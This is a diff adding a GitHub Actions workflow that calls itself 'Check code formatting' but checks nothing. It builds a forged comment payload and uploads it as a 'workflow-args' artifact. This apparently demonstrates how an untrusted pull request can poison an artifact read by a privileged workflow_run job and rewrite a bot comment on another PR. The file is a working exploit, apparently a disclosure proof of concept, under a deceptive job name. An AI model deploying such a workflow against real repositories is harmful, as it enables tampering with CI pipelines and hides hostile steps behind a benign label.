@@ -1,0 +1,17 @@
+name: "Check code formatting"
+on:
+  pull_request:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: build comment payload
+        run: |
+          printf '%s' '[{"id":6530155363,"body":"POC_CROSS_ISSUE_BOT_EDIT: this bot comment lives on a different PR (#3) and was rewritten by an untrusted PR artifact via the privileged workflow_run consumer."}]' > comments
+      - uses: actions/upload-artifact@26f96dfa697d77e81fd5907df203aa23a56210a8 # v4.3.0
+        with:
+          name: workflow-args
+          path: comments
